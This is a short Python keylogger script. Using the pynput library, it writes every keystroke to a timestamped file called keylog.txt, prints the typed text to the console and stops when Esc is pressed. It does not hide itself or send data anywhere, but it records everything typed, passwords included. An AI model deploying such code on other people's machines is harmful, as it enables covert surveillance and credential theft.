import logging
from pynput import keyboard

# Set up logging
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

# Initialize a variable to store the sentence
sentence = ""

def on_press(key):
    global sentence
    try:
        # Add the character to the sentence
        sentence += key.char
        # Log the individual character
        logging.info(str(key.char))
    except AttributeError:
        # Handle special keys (like space, enter, etc.)
        if key == keyboard.Key.space:
            sentence += ' '
            logging.info(' ')
        elif key == keyboard.Key.enter:
            sentence += '\n'
            logging.info('\n')
        else:
            logging.info(str(key))
    # Print the current sentence to the console
    print(sentence)

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        print("Escape key pressed. Exiting...")
        return False

# Start listening to the keyboard
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
